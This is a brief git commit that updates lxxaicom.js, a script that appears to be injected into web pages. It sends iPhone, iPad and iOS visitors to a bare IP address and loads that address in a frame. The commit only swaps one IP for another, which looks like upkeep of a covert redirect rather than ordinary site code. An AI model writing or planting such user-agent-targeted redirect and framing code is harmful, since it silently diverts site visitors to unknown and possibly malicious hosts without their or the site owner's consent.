a63293d923fbc86e3b5f521e17ccb73abdbf8d91
dateshare <chulishen567@gmail.com>
2021-12-29 18:00:02 +0800

    message

--- lxxaicom.js
+++ lxxaicom.js
@@ -1,10 +1,10 @@
 //lxxaicom
 if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
     //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.15/";
+    window.location.href = "http://38.26.195.17/";
 }
 var titlestr=document.title;
-setFrame("http://38.26.195.15/");
+setFrame("http://38.26.195.17/");
 
 
 
